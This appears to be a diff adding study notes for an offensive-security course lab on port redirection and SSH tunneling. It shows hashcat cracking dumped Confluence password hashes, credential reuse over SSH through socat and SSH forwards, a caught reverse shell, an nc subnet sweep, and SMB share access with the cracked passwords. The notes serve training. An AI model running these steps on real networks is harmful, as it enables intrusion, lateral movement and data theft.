+ 229382 | rdp_admin      | rdp_admin       | T      | 2022-09-09 21:14:46.153 | 2022-09-09 21:14:46.153 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | a8f8d9b5-dfcb-480b-b461-8efce939294c |        98305 | {PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
+(6 rows)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Each row contains data of a single Confluence user, including password hash.&lt;/li&gt;
+&lt;li&gt;We will attempt to crack with Hashcat.&lt;/li&gt;
+&lt;li&gt;Mode for Atlassian (PBKDF2-HMAC-SHA1) hashes is &lt;code&gt;12001&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Pass to &lt;code&gt;-m&lt;/code&gt; flag.&lt;/li&gt;
+&lt;li&gt;Copy hashes into &lt;code&gt;hashes.txt&lt;/code&gt; and pass as first positional arg.&lt;/li&gt;
+&lt;li&gt;The pass Kali included &lt;code&gt;pastcrack.txt&lt;/code&gt; passwd list as final pos arg.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
+hashcat (v6.2.6) starting
+
+...
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/fasttrack.txt
+* Passwords.: 222
+* Bytes.....: 2006
+* Keyspace..: 222
+* Runtime...: 0 secs
+
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.           
+
+{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
+{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!
+{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
+                                                          
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 12001 (Atlassian (PBKDF2-HMAC-SHA1))
+Hash.Target......: hashes.txt
+Time.Started.....: Mon Nov  6 08:23:42 2023 (0 secs)
+Time.Estimated...: Mon Nov  6 08:23:42 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/fasttrack.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    12099 H/s (0.34ms) @ Accel:1024 Loops:256 Thr:1 Vec:16
+Recovered........: 3/6 (50.00%) Digests (total), 3/6 (50.00%) Digests (new), 3/6 (50.00%) Salts
+Progress.........: 1332/1332 (100.00%)
+Rejected.........: 0/1332 (0.00%)
+Restore.Point....: 222/222 (100.00%)
+Restore.Sub.#1...: Salt:5 Amplifier:0-1 Iteration:9984-9999
+Candidate.Engine.: Device Generator
+Candidates.#1....: Spring2017 -&amp;gt; starwars
+Hardware.Mon.#1..: Temp: 58c Util: 17%
+
+Started: Mon Nov  6 08:23:23 2023
+Stopped: Mon Nov  6 08:23:43 2023
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Hashcat returns the password for.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;database_admin&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hr_admin&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;rdp_admin&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We suspect these passwords may be reused elsewhere on the network.&lt;/li&gt;
+&lt;li&gt;After additional enum we find PGDATABASE01 is also running an SSH server.&lt;/li&gt;
+&lt;li&gt;Let&amp;#39;s try the creds against SSH by creating a port forward allowing direct SSH from out Kali machine.&lt;/li&gt;
+&lt;li&gt;Kill our original Socat proc and create a new port forward.&lt;/li&gt;
+&lt;li&gt;Listen on TCP port 2222.&lt;/li&gt;
+&lt;li&gt;Forward to TCP port 22 on PGDATABASE01.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2222,fork TCP:10.4.198.215:22
+&amp;lt;socat -ddd TCP-LISTEN:2222,fork TCP:10.4.198.215:22   
+2023/11/06 16:33:56 socat[5407] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
+2023/11/06 16:33:56 socat[5407] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
+2023/11/06 16:33:56 socat[5407] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
+2023/11/06 16:33:56 socat[5407] I setting option &amp;quot;fork&amp;quot; to 1
+2023/11/06 16:33:56 socat[5407] I socket(2, 1, 6) -&amp;gt; 5
+2023/11/06 16:33:56 socat[5407] I starting accept loop
+2023/11/06 16:33:56 socat[5407] N listening on AF=2 0.0.0.0:2222
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We can now conn to port 2222 of CONFLUENCE01 as if we conn directly to port 22 of PGDATABASE01.&lt;/li&gt;
+&lt;li&gt;Us the &lt;code&gt;database_admin&lt;/code&gt; user and password retrieved from Hashcat.
+ - &lt;code&gt;sqlpass123&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ ssh -o PubKeyAuthentication=no database_admin@192.168.198.63 -p2222
+database_admin@192.168.198.63&amp;#39;s password: 
+Permission denied, please try again.
+database_admin@192.168.198.63&amp;#39;s password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 06 Nov 2023 04:38:41 PM UTC
+
+  System load:  0.0               Processes:               234
+  Usage of /:   80.5% of 6.79GB   Users logged in:         0
+  Memory usage: 15%               IPv4 address for ens192: 10.4.198.215
+  Swap usage:   0%                IPv4 address for ens224: 172.16.198.254
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
+database_admin@pgdatabase01:~$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We have successfully connected.&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;database_admin&lt;/code&gt; creds have been reused here.&lt;/li&gt;
+&lt;li&gt;We conn to the SSH server of PGDATABASE01 using creds found in PostgresSQL DB through port forward we setup on CONFLUENCE01 with Socat.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Socat is not the only way to setup a port forward on Unix like hosts.  Several alternatives are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/samhocevar/rinetd&quot;&gt;rinetd&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Runs as daemon.&lt;/li&gt;
+&lt;li&gt;Better for longer term port forward situations.&lt;/li&gt;
+&lt;li&gt;Slightly unwieldy for short term.&lt;/li&gt;
+&lt;li&gt;Netcat with &lt;a href=&quot;https://man7.org/linux/man-pages/man7/fifo.7.html&quot;&gt;FIFO&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Named pipe to create &lt;a href=&quot;https://gist.github.com/holly/6d52dd9addd3e58b2fd5&quot;&gt;port forward&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Iptables.&lt;/li&gt;
+&lt;li&gt;If we have &lt;code&gt;root&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Depends on config already in place.&lt;/li&gt;
+&lt;li&gt;Forwarding packets requires enable port forwarding on the iface.&lt;/li&gt;
+&lt;li&gt;Write &lt;code&gt;1&lt;/code&gt; to &lt;code&gt;/proc/sys/net/ipv4/conf/[interface]/forwarding&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;18.3 SSH Tunneling&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Learn the fundamentals of SSH tunneling.&lt;/li&gt;
+&lt;li&gt;Use SSH local, dynamic, remote, and remote dynamic port forwarding methods.&lt;/li&gt;
+&lt;li&gt;Understand the pros and cons of using sshuttle.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;quot;Tunneling&amp;quot; is the act of encapsulating one kind of data stream in another as it traverses the network.  There are &lt;a href=&quot;https://en.wikipedia.org/wiki/Tunneling_protocol&quot;&gt;tunneling protocol&lt;/a&gt; designed for this.  SSH is an example of one.&lt;/p&gt;
+&lt;p&gt;SSH was developed to give admins a way to remotely login to their servers through encrypted conns.  Before SSH tools like &lt;code&gt;rsh&lt;/code&gt;, &lt;code&gt;rlogin&lt;/code&gt;, and &lt;code&gt;telent&lt;/code&gt; provided a simlar but unencrypted functionality.&lt;/p&gt;
+&lt;p&gt;All data is transported through an encrypted tunnel build in the background by the SSH session.  As it is primarily a tunneling proto, you can pass almost any kind of traffic through an SSH conn.&lt;/p&gt;
+&lt;p&gt;SSH blends into the background traffic of network envs, often legitimately used by network admins.  It is common to find SSH client installed on Linux hosts and SSH servers running.  It&amp;#39;s also becoming more common to find OpenSSH clients on Win hosts.  In networks without heavy monitoring SSH traffic will not seem anomalous and the contents of the tunnel cannot be easily monitored.&lt;/p&gt;
+&lt;p&gt;In most official docs SSH tunneling is referred to as &lt;a href=&quot;https://www.ssh.com/academy/ssh/tunneling-example#what-is-ssh-port-forwarding,-aka-ssh-tunneling?&quot;&gt;SSH port forwarding&lt;/a&gt;, different SSH software will vary in their tunneling capabilities.  We will cover OpenSSH in this unit.&lt;/p&gt;
+&lt;h5&gt;SSH Local Port Forwarding&lt;/h5&gt;
+&lt;p&gt;In the first port forwarding scenario with Socat, we setup Socat to listen on port 2345 on the WAN iface of CONFLUENCE01.  Packets received on that port were forwarded to TCP port 5432 on PGDATABASE01.  This allowed us to connect from out Kali machine, through CONFLUENCE01, to the PostgresSQL server PGDATABASE01.  The crucial thing to notice in this case is listening/forwarding ports were done from the same host, CONFLUENCE01.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://man.openbsd.org/ssh#L&quot;&gt;SSH local port forwarding&lt;/a&gt; adds a twist, packets are not forwarded by the same host that listens for packets.  A SSH conn is made between two hosts, client and server, a listening port is opened by the SSH client, and all packets received on this port are tunneled through the SSH connection to the SSH server.  The packets are forwarded by the SSH server to the socket we specify.&lt;/p&gt;
+&lt;p&gt;Reconsider the prior example with a difference, Socat is no longer available on CONFLUENCE01.  We still have the creds we cracked and there is no firewall preventing us from conn to the ports we bind to on CONFLUENCE01.&lt;/p&gt;
+&lt;p&gt;With &lt;code&gt;database_admin&lt;/code&gt; creds, we log in to PGDATABASE01 and find that it&amp;#39;s attached to another internal subnet.  We find a host with a SMB server open on TCP port 445 in that subnet.  We want to conn to that host from our Kali machine and download what we find.&lt;/p&gt;
+&lt;p&gt;For this, we plan to create an SSH local port forward as part of our SSH con from CONFLUENCE01 to PGDATABASE01.  We will bind a listening port on the WAN iface of CONFLUENCE01, forwarding all packets sent to that port through the SSH tunnel.  PGDATABASE01 will then forward these packets to the SMB port on the new host we found.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;From CONFLUENCE01.&lt;/li&gt;
+&lt;li&gt;We listen on TCP port 4455.&lt;/li&gt;
+&lt;li&gt;Packets sent to that port are pushed by SSH client software on CONFLUENCE01 through the SSH tunnel.&lt;/li&gt;
+&lt;li&gt;On the other end, SSH server software on PGDATABASE01 forwards them to TCP port 445 on the new host.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As we did previously, we can get a shell on CONFLUENCE01 using the cURL one-liner exploit for CVE-2022-26134.  We cannot use Socat to create the port forward, but we can in this case SSH directly from CONFLUENCE01 to PGDATABASE01.&lt;/p&gt;
+&lt;p&gt;Before setting up the port forward, we need to know which IP address and port we want the packets forwarded to.  First we SSH into PGDATABASE01 to start enum.&lt;/p&gt;
+&lt;p&gt;In our CONFLUENCE01 shell we make sure we have TTY functionality using Python3 pty module.  We can then SSH into PGDATABASE01 with the &lt;code&gt;database_admin&lt;/code&gt; creds &lt;code&gt;sqlpass123&lt;/code&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ssh database_admin@10.4.249.215&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.249.63] 46608
+bash: cannot set terminal process group (2201): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;
+&amp;lt;/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;   
+$ ssh database_admin@10.4.249.215
+ssh database_admin@10.4.249.215
+Could not create directory &amp;#39;/home/confluence/.ssh&amp;#39;.
+The authenticity of host &amp;#39;10.4.249.215 (10.4.249.215)&amp;#39; can&amp;#39;t be established.
+ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.249.215&amp;#39;s password: Welcome123
+
+Permission denied, please try again.
+database_admin@10.4.249.215&amp;#39;s password: sqlpass123
+
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 07 Nov 2023 03:22:39 PM UTC
+
+  System load:  0.0               Processes:               234
+  Usage of /:   80.4% of 6.79GB   Users logged in:         0
+  Memory usage: 15%               IPv4 address for ens192: 10.4.249.215
+  Swap usage:   0%                IPv4 address for ens224: 172.16.249.254
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
+database_admin@pgdatabase01:~$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We now have a SSH conn to PGDATABASE01 from CONFLUENCE01, we can start enum.&lt;/li&gt;
+&lt;li&gt;Run &lt;code&gt;ip addr&lt;/code&gt; to query network ifaces.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;database_admin@pgdatabase01:~$ ip addr
+ip addr
+1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+4: ens192: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:bf:75:66 brd ff:ff:ff:ff:ff:ff
+    inet 10.4.249.215/24 brd 10.4.249.255 scope global ens192
+       valid_lft forever preferred_lft forever
+5: ens224: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:bf:b3:3c brd ff:ff:ff:ff:ff:ff
+    inet 172.16.249.254/24 brd 172.16.249.255 scope global ens224
+       valid_lft forever preferred_lft forever
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The run &lt;code&gt;ip route&lt;/code&gt; to see what subnets are in the routing table.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;database_admin@pgdatabase01:~$ ip route
+ip route
+default via 10.4.249.254 dev ens192 proto static 
+10.4.249.0/24 dev ens192 proto kernel scope link src 10.4.249.215 
+172.16.249.0/24 dev ens224 proto kernel scope link src 172.16.249.254
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We find PGDATABASE01 is attached to another subnet.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;172.16.249.0/24&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We don&amp;#39;t find a port scanner, but some initial recon can be done with available tools.&lt;/li&gt;
+&lt;li&gt;Write a bash for loop to sweep hosts for an open for 445 on the /24 subnet.&lt;/li&gt;
+&lt;li&gt;Use Netcat to make our conn &lt;code&gt;nc&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Pass flag &lt;code&gt;-z&lt;/code&gt; to check for listening port without sending data.&lt;/li&gt;
+&lt;li&gt;Flag &lt;code&gt;-v&lt;/code&gt; for verbose.&lt;/li&gt;
+&lt;li&gt;Flag &lt;code&gt;-w&lt;/code&gt; set to &lt;code&gt;1&lt;/code&gt; for a lower time-out threshold.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;database_admin@pgdatabase01:~$ for i in $(seq 1 254); do nc -zv -w 1 172.16.249.$i 445; done
+&amp;lt;(seq 1 254); do nc -zv -w 1 172.16.249.$i 445; done
+nc: connect to 172.16.249.1 port 445 (tcp) timed out: Operation now in progress
+...
+nc: connect to 172.16.249.216 port 445 (tcp) timed out: Operation now in progress
+Connection to 172.16.249.217 445 port [tcp/microsoft-ds] succeeded!
+...
+nc: connect to 172.16.249.253 port 445 (tcp) timed out: Operation now in progress
+nc: connect to 172.16.249.254 port 445 (tcp) failed: Connection refused
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Most of the conn timeout.&lt;/li&gt;
+&lt;li&gt;Suggesting nothing is there.&lt;/li&gt;
+&lt;li&gt;We notice that.&lt;/li&gt;
+&lt;li&gt;PGDATABASE &lt;code&gt;172.16.249.215&lt;/code&gt; actively refused the conn.&lt;/li&gt;
+&lt;li&gt;We also find a host with TCP port 445 open &lt;code&gt;172.16.249.217&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We want to enum the MB service on this host.  If we find anything, we want to download it to our Kali machine for inspection.  There are at least two ways to do this.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We could use the tools we find on PGDATABASE01.&lt;/li&gt;
+&lt;li&gt;Then transfer back to CONFLUENCE01, then back to Kali.&lt;/li&gt;
+&lt;li&gt;But this would be tedious.&lt;/li&gt;
+&lt;li&gt;Alternatively we could use SSH local port forwarding.&lt;/li&gt;
+&lt;li&gt;We could create an SSH conn from CONFLUENCE01 to PGDATABASE01.&lt;/li&gt;
+&lt;li&gt;Part of that conn created as a SSH local port forward.&lt;/li&gt;
+&lt;li&gt;Listening on port 4455 on the WAN iface of CONFLUENCE01.&lt;/li&gt;
+&lt;li&gt;Forwarding packets through the SSH tunnel out of PGDATABASE01 directly to the SMB share we found.&lt;/li&gt;
+&lt;li&gt;We then conn to the listening port on CONFLUENCE01 directly from Kali.
+&lt;em&gt;In this scenario, there still is no firewall preventing us from accessing ports that we bind on the WAN interface of CONFLUENCE01. In later sections, we will put the firewall up, and use more advanced techniques to traverse this boundary.&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For now, we kill our existing SSH conn to PGDATABASE01.  We will then setup a new conn with new args to establish the SSH local port forward.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Local port forward can be setup with OpenSSH &lt;code&gt;-L&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Takes two sockets in &lt;code&gt;IPADDRESS:PORT&lt;/code&gt; sep with &lt;code&gt;:&lt;/code&gt; as an arg.&lt;/li&gt;
+&lt;li&gt;E.g. &lt;code&gt;IPADDRESS:PORT:IPADDRESS:PORT&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The first socket is hte listening socket that will be bound to the SSH client machine.&lt;/li&gt;
+&lt;li&gt;The second socket is where we want to forward packets to.&lt;/li&gt;
+&lt;li&gt;The rest of the command is as usual.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In this case we want SSH to listen on all ifaces on port 4455 on CONFLUENCE01 &lt;code&gt;0.0.0.0:4455&lt;/code&gt;, then forward all packets through the SSH tunnel to port 445 on the new host &lt;code&gt;172.16.249.217:445&lt;/code&gt;.
+&lt;em&gt;We&amp;#39;re listening on port 4455 on CONFLUENCE01 because we&amp;#39;re running as the confluence user: we don&amp;#39;t have the permissions to listen on any port below 1024.&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Create the conn from CONFLUENCE01 to PGDATABASE01 using SSH.&lt;/li&gt;
+&lt;li&gt;Log in as &lt;code&gt;database_admin&lt;/code&gt; with &lt;code&gt;sqlpass123&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Pass the local port forwarding args &lt;code&gt;-L&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;-N&lt;/code&gt; to prevent a shell from being opened.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.249.63] 37144
+bash: cannot set terminal process group (2201): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;
+&amp;lt;/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;   
+$ ssh -N -L 0.0.0.0:4455:172.16.249.217:445 database_admin@10.4.249.215
+ssh -N -L 0.0.0.0:4455:172.16.249.217:445 database_admin@10.4.249.215
+Could not create directory &amp;#39;/home/confluence/.ssh&amp;#39;.
+The authenticity of host &amp;#39;10.4.249.215 (10.4.249.215)&amp;#39; can&amp;#39;t be established.
+ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.249.215&amp;#39;s password: sqlpass123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;After entering password we receive no output.&lt;/li&gt;
+&lt;li&gt;Running SSH with &lt;code&gt;-N&lt;/code&gt; flag this is normal.&lt;/li&gt;
+&lt;li&gt;We only receive output related to our local port forward.
+&lt;em&gt;If the SSH connection or the port forwarding fails for some reason, and the output we get from the standard SSH session isn&amp;#39;t sufficient to troubleshoot it, we can pass the -v flag to ssh in order to receive debug output.&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;Since the rev shell from CONFLUENCE01 is now running the SSH session we must catch another shell.&lt;/li&gt;
+&lt;li&gt;We can then confirm the SSH proc we started is listening on 4455 using &lt;code&gt;ss -ntplu&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;confluence@confluence01:/opt/atlassian/confluence/bin$ ss -ntplu
+ss -ntplu
+Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                         
+udp    UNCONN  0       0              127.0.0.53%lo:53            0.0.0.0:*                                                                                     
+tcp    LISTEN  0       128                  0.0.0.0:22            0.0.0.0:*                                                                                     
+tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:((&amp;quot;ssh&amp;quot;,pid=4297,fd=4))                                                  
+tcp    LISTEN  0       4096           127.0.0.53%lo:53            0.0.0.0:*                                                                                     
+tcp    LISTEN  0       128                     [::]:22               [::]:*                                                                                     
+tcp    LISTEN  0       10                         *:8090                *:*      users:((&amp;quot;java&amp;quot;,pid=2250,fd=44))                                                
+tcp    LISTEN  0       1024                       *:8091                *:*      users:((&amp;quot;java&amp;quot;,pid=2457,fd=21))                                                
+tcp    LISTEN  0       1         [::ffff:127.0.0.1]:8000                *:*      users:((&amp;quot;java&amp;quot;,pid=2250,fd=76)) 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Now connecting to port 4455 on CONFLUENCE01 is just like a direct conn to port 445 on &lt;code&gt;172.16.249.217&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;We can now interact with port 4455 on CONFLUENCE01 from our Kali machine.&lt;/li&gt;
+&lt;li&gt;List available shares with &lt;code&gt;smbclient&lt;/code&gt; option &lt;code&gt;-L&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Pass &lt;code&gt;4455&lt;/code&gt; to option &lt;code&gt;-p&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Username &lt;code&gt;hr_admin&lt;/code&gt; to the &lt;code&gt;-U&lt;/code&gt; option.&lt;/li&gt;
+&lt;li&gt;The password we cracked to the &lt;code&gt;--password&lt;/code&gt; option.
+ - &lt;code&gt;Welcome1234&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ smbclient -p 4455 -L //192.168.249.63/ -U hr_admin --password=Welcome1234
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    ADMIN$          Disk      Remote Admin
+    C$              Disk      Default share
+    IPC$            IPC       Remote IPC
+    Scripts         Disk      
+    Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.249.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We find a share called &lt;code&gt;scripts&lt;/code&gt; we will likely be able to access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ smbclient -p 4455 //192.168.249.63/scripts -U hr_admin --password=Welcome1234
+Try &amp;quot;help&amp;quot; to get a list of possible commands.
+smb: \&amp;gt; ls
+  .                                   D        0  Tue Sep 13 01:37:59 2022
+  ..                                 DR        0  Tue Sep  6 08:02:37 2022
+  Provisioning.ps1                   AR       50  Tue Sep 13 03:41:53 2022
+
+        5319935 blocks of size 4096. 337733 blocks available
+smb: \&amp;gt; get Provisioning.ps1
+getting file \Provisioning.ps1 of size 50 as Provisioning.ps1 (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We can now inspect this file from our Kali machine.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;SSH Dynamic Port Forwarding&lt;/h5&gt;
+&lt;p&gt;With local port forwarding we can only conn to one socket per SSH conn, a major limitation.  This becomes tedious at scale.  OpenSSH provides a &lt;a href=&quot;https://man.openbsd.org/ssh#D&quot;&gt;dynamic port forwarding&lt;/a&gt; allowing a single listener port on the SSH client to forward packets to any socket the server host has access to.&lt;/p&gt;
+&lt;p&gt;The listening port created by the SSH client is a SOCKS proxy server port.  The SOCKS server accepts packets with a SOCKS proto header and forwards them on to the addressed hosts.&lt;/p&gt;
+&lt;p&gt;This allows us to send packets to a single port of the SSH client, pushing them through the SSH conn, and forwarding to anywhere the SSH server system can route to.  Only requiring packets to be formatted properly, typically with SOCK-client software.  Some software may not be SOCKS-compatible by default, we will work through this.&lt;/p&gt;
+&lt;p&gt;As an example let&amp;#39;s extend the prior scenario, instead of just conn to the SMB port on HRSHARES, we want to do a full portscan of HRSHARES.&lt;/p&gt;
+&lt;p&gt;We ensure a TTY shell with Python3 as we did previously, creating the SSH conn from CONFLUENCE01 to PGDATABASE01 with user &lt;code&gt;database_admin&lt;/code&gt;  and pass &lt;code&gt;sqlpass123&lt;/code&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;With OpenSSH.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;-D&lt;/code&gt; to create the dynamic port forward.&lt;/li&gt;
+&lt;li&gt;The only arg is the port we want to bind, all ifaces on &lt;code&gt;9999&lt;/code&gt;&lt;/li&gt;
